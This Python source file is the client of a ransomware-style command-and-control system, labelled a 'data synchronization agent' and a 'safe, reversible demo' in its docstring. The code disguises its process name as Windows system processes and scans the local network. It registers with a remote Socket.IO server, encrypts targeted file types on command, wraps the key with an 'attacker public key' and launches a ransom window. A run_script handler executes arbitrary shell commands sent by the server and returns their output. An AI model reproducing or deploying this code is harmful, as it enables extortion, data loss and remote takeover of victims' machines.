"""
Data synchronization agent for system operations.

Runs on client systems, registers with backend server, connects via Socket.IO,
and performs file operations in the designated work folder.

Defaults:
- Work path: C:\\Users\\user\\Documents\\cache\\ (override with WORK_DIR env var)
- Backend URL: set BACKEND_URL env var or pass --backend

Usage (PowerShell/CMD):
    pip install -r requirements.txt
    python py_simple/device_client.py --backend https://sample-2ang.onrender.com

This is a safe, reversible demo for research and lab testing.
"""
from __future__ import annotations

import argparse
import os
import socket
import time
import requests
import base64
import subprocess
import socketio  # python-socketio client
import sys
import platform
import ctypes
from urllib.parse import urlsplit, urlunsplit

# Import processor from local package
try:
    from py_simple.core_handler import DataProcessor
    from py_simple.analytics_module import BehaviorSimulator
except Exception:
    from core_handler import DataProcessor
    from analytics_module import BehaviorSimulator


def set_process_name(name: str):
    """Masquerade process name (platform-specific)."""
    try:
        if platform.system() == "Linux":
            # Linux: modify process name via prctl
            try:
                libc = ctypes.CDLL('libc.so.6')
                PR_SET_NAME = 15
                libc.prctl(PR_SET_NAME, name.encode(), 0, 0, 0)
                print(f"[client] Process name set to: {name}")
            except Exception as e:
                print(f"[client] Failed to set process name (Linux): {e}")
        
        elif platform.system() == "Windows":
            # Windows: no direct process name change, but can rename window title
            try:
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleTitleW(name)
                print(f"[client] Console title set to: {name}")
            except Exception as e:
                print(f"[client] Failed to set console title (Windows): {e}")
        
        # Alternative: modify sys.argv[0] (visible in some process lists)
        if sys.argv:
            sys.argv[0] = name
            
    except Exception as e:
        print(f"[client] Process masquerading failed: {e}")


def main():
    # Masquerade as a legitimate Windows system process
    process_names = ["svchost.exe", "RuntimeBroker.exe", "taskhostw.exe", "dwm.exe"]
    import random
    chosen_name = random.choice(process_names)
    set_process_name(chosen_name)
    
    parser = argparse.ArgumentParser(description="Device client for safe processor")
    parser.add_argument("--backend", dest="backend", default=os.getenv("BACKEND_URL"), help="Backend base URL, e.g. https://sample-2ang.onrender.com")
    parser.add_argument("--hostname", dest="hostname", default=socket.gethostname(), help="Hostname to report to server")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification (diagnostics only)")
    parser.add_argument("--polling", action="store_true", help="Force Socket.IO polling transport (no WebSocket)")
    parser.add_argument("--debug", action="store_true", help="Enable verbose Socket.IO logging")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--recursive", action="store_true", help="Process files in subfolders (default)")
    group.add_argument("--no-recursive", dest="no_recursive", action="store_true", help="Disable processing subfolders")
    args = parser.parse_args()

    # Allow prompting for backend when launched by double-click (set PROMPT_BACKEND=1)
    if not args.backend and os.getenv("PROMPT_BACKEND") == "1":
        try:
            entered = input("Enter backend URL (e.g., https://sample-2ang.onrender.com): ").strip()
            if entered:
                args.backend = entered
        except Exception:
            pass

    if not args.backend:
        raise SystemExit("Please provide --backend or set BACKEND_URL")

    # Ensure backend has no trailing slash
    backend = args.backend.rstrip("/")

    # Configure sandbox dir (Windows VM path by default)
    work_dir = os.getenv("WORK_DIR") or r"C:\\Users\\user\\test\\"
    # Recursive mode: default ON unless explicitly disabled via flag or env
    env_rec = os.getenv("SANDBOX_RECURSIVE")
    if args.no_recursive:
        recursive = False
    elif args.recursive:
        recursive = True
    elif env_rec is not None:
        recursive = env_rec.strip().lower() in ("1", "true", "yes", "on")
    else:
        recursive = True
    processor = DataProcessor(work_dir, recursive=recursive)
    behavior = BehaviorSimulator(work_dir)
    print(f"[client] Sandbox directory: {processor.test_directory}")
    print(f"[client] Recursive mode: {'on' if processor.recursive else 'off'}")
    
    # Perform network reconnaissance
    print("[client] Initiating network reconnaissance...")
    try:
        scan_results = behavior.scan_network_hosts()
        print(f"[client] Network scan complete: {scan_results.get('active_targets', 0)} active targets found")
    except Exception as e:
        print(f"[client] Network scan failed: {e}")

    # Prepare a requests session so we can control TLS verification for all HTTP calls
    session = requests.Session()
    session.verify = not args.insecure

    # Probe backend status for quick diagnostics
    try:
        s = session.get(f"{backend}/status", timeout=5)
        print(f"[client] Backend /status -> {s.status_code}")
    except Exception as e:
        print(f"[client] Backend /status probe failed: {e}")

    # Register to get a device token and public key (with retries)
    attempts, delay = 3, 2
    last_err = None
    for i in range(1, attempts + 1):
        try:
            res = session.post(
                f"{backend}/publickey",
                json={"hostname": args.hostname},
                timeout=25,
            )
            res.raise_for_status()
            data = res.json()
            device_token = data.get("device_token")
            ws_url = data.get("ws_url") or backend
            print(f"[client] Received device token: {device_token}")
            print("[client] Public key (demo):\n" + (data.get("public_key_pem") or "<none>"))
            if not device_token:
                raise RuntimeError("No device_token in response")
            break
        except Exception as e:
            last_err = e
            print(f"[client] Register attempt {i}/{attempts} failed: {e}")
            if i < attempts:
                time.sleep(delay)
                delay *= 2
    if last_err and 'device_token' not in locals():
        raise SystemExit(f"Failed to register after {attempts} attempts: {last_err}")

    # Connect to Socket.IO
    # Pass the session to Socket.IO so polling transport also uses our TLS settings
    sio = socketio.Client(
        reconnection=True,
        http_session=session,
        logger=args.debug,
        engineio_logger=args.debug,
    )

    @sio.event
    def connect():
        print("[client] Connected to server, authenticating…")
        sio.emit("authenticate", {"device_token": device_token})

    @sio.on("auth_ok")
    def on_auth_ok(msg):
        print("[client] Authenticated.")
        # After auth, send device hello (no keys; keys originate from site)
        try:
            sio.emit("device_hello", {
                "device_token": device_token,
                "hostname": args.hostname,
            })
        except Exception as e:
            print(f"[client] Failed to send device_hello: {e}")

    @sio.on("auth_error")
    def on_auth_error(msg):
        print(f"[client] Auth error: {msg}")
        sio.disconnect()

    # Track whether we've already wrapped and stored our AES key for this session
    state = {"wrapped": False}

    def _device_key_path():
        # Place a .key file in sandbox root to simulate per-victim key blob storage
        return os.path.join(processor.test_directory, "sys_cache.dat")

    def _get_attacker_public_key() -> str | None:
        try:
            # Query device registry and find this device by token
            r = session.get(f"{backend}/devices", timeout=10)
            r.raise_for_status()
            devs = (r.json() or {}).get("devices") or []
            for d in devs:
                if d.get("token") == device_token:
                    return d.get("public_key_pem")
        except Exception as e:
            print(f"[client] Failed to fetch attacker public key: {e}")
        return None

    @sio.on("process")
    def on_process(_msg=None):
        print("[client] Received ENCRYPT signal – starting file processing…")
        try:
            # Process only targeted file types (.png, .pdf, .xls, .txt, .mp4)
            files = processor.process_files(backup_mode=False)
            print(f"[client] Processed files: {len(files)}")
            print(f"[client] Targeted extensions: {', '.join(processor.TARGET_EXTENSIONS)}")
            
            # Flow A: wrap K_AES with attacker's RSA pubkey and store alongside files
            if not state["wrapped"]:
                attacker_pub = _get_attacker_public_key()
                if attacker_pub:
                    try:
                        from cryptography.hazmat.primitives import serialization, hashes
                        from cryptography.hazmat.primitives.asymmetric import padding
                        pub = serialization.load_pem_public_key(attacker_pub.encode())
                        k_b64 = processor.get_key()
                        k = base64.b64decode(k_b64)
                        wrapped = pub.encrypt(
                            k,
                            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
                        )
                        os.makedirs(processor.test_directory, exist_ok=True)
                        with open(_device_key_path(), "wb") as f:
                            f.write(base64.b64encode(wrapped))
                        state["wrapped"] = True
                        print("[client] Stored wrapped AES key blob (.key)")
                    except Exception as e:
                        print(f"[client] Key processing failed: {e}")
                else:
                    print("[client] No public key available; skipping key operation.")
            # Create completion marker
            try:
                marker = os.path.join(processor.work_directory, "process_complete.log")
                with open(marker, "w", encoding="utf-8") as f:
                    f.write(
                        "Data processing completed successfully.\n\n" \
                        "Contact support for restoration procedures.\n" \
                        "System backup maintained."
                    )
                print("[client] Created completion marker")
            except Exception as e:
                print(f"[client] Failed to create marker: {e}")
            
            # Show ransom window after encryption completes
            try:
                print("[client] Launching ransom window...")
                try:
                    from py_simple.ransom_window import show_ransom_window
                except ImportError:
                    from ransom_window import show_ransom_window
                
                # Launch window in separate thread so socket connection stays alive
                show_ransom_window(hours=48, blocking=False)
                print("[client] Ransom window launched")
            except Exception as e:
                print(f"[client] Failed to launch ransom window: {e}")
                
        except Exception as e:
            print(f"[client] Processing failed: {e}")

    @sio.on("restore")
    def on_restore(msg=None):
        print("[client] Received RESTORE signal – recovering files…")
        # Read key data and restore files
        try:
            key_path = _device_key_path()
            if os.path.exists(key_path):
                try:
                    with open(key_path, "rb") as f:
                        wrapped_b64 = f.read().decode()
                    req = {"token": device_token, "wrapped_key_base64": wrapped_b64}
                    # If server pushed a private key in message, include as override (lab/demo)
                    if msg and isinstance(msg, dict) and msg.get("private_key_pem"):
                        req["private_key_pem"] = msg["private_key_pem"]
                    r = session.post(f"{backend}/keys/unwrap", json=req, timeout=20)
                    if r.ok:
                        aes_b64 = (r.json() or {}).get("aes_key_base64")
                        if aes_b64:
                            processor.set_key_from_base64(aes_b64)
                            print("[client] AES key restored from attacker response")
                        else:
                            print("[client] Unwrap response missing aes_key_base64")
                    else:
                        print(f"[client] Unwrap failed: {r.status_code} {r.text}")
                except Exception as e:
                    print(f"[client] Failed to request unwrap: {e}")
            else:
                print("[client] No wrapped key blob found; attempting decryption with current key")
            processor.restore_files()
            print("[client] Decryption complete")
        except Exception as e:
            print(f"[client] Decryption failed: {e}")

    @sio.event
    def disconnect():
        print("[client] Disconnected. Will try to reconnect…")

    @sio.on("run_script")
    def on_run_script(msg=None):
        try:
            cmd = (msg or {}).get("command")
            if not cmd:
                print("[client] run_script received without command")
                return
            print(f"[client] Running command: {cmd}")
            # On Windows VMs this can run python C:\path\to\script.py as requested
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print("[client] run_script exit code:", result.returncode)
            if result.stdout:
                print("[client] run_script stdout:\n" + result.stdout)
            if result.stderr:
                print("[client] run_script stderr:\n" + result.stderr)
            # Emit output back to server for UI
            try:
                sio.emit('script_output', {
                    'device_token': device_token,
                    'command': cmd,
                    'returncode': result.returncode,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'ts': int(time.time()),
                })
            except Exception as e:
                print(f"[client] Failed to emit script_output: {e}")
        except Exception as e:
            print(f"[client] run_script failed: {e}")

    # Socket.IO server URL: if backend ends with /py_simple, connect sockets to origin
    try:
        # Origin without path
        parts = urlsplit(backend)
        origin = urlunsplit((parts.scheme, parts.netloc, '', '', ''))
        socket_base = origin if parts.path.rstrip('/') == '/py_simple' else backend
        print(f"[client] Connecting to {socket_base} …")
        transports = ["polling"] if args.polling else ["websocket", "polling"]
        # socketio_path default is 'socket.io' but set explicitly to avoid proxy/path issues.
        sio.connect(
            socket_base,
            transports=transports,
            wait_timeout=30,
            socketio_path='socket.io'
        )
    except Exception as e:
        raise SystemExit(f"Failed to connect to Socket.IO: {e!r}")

    # Keep the client alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[client] Exiting…")
        sio.disconnect()

def _run_with_optional_pause():
    """Run main() and optionally pause on exit when PAUSE_ON_EXIT=1 is set.

    Useful when double-clicking on Windows so the console doesn't close instantly.
    """
    pause = os.getenv("PAUSE_ON_EXIT") == "1"
    try:
        main()
    except SystemExit as e:
        # Print the error and pause if requested; re-raise only when not pausing so exit codes are preserved in CI/terminals
        msg = str(e) or "Exiting"
        print(f"[client] {msg}")
        if pause:
            try:
                input("Press Enter to exit…")
            except Exception:
                pass
        else:
            raise
    except Exception as e:
        print(f"[client] Unhandled error: {e}")
        if pause:
            try:
                input("Press Enter to exit…")
            except Exception:
                pass
        else:
            raise


if __name__ == "__main__":
    _run_with_optional_pause()
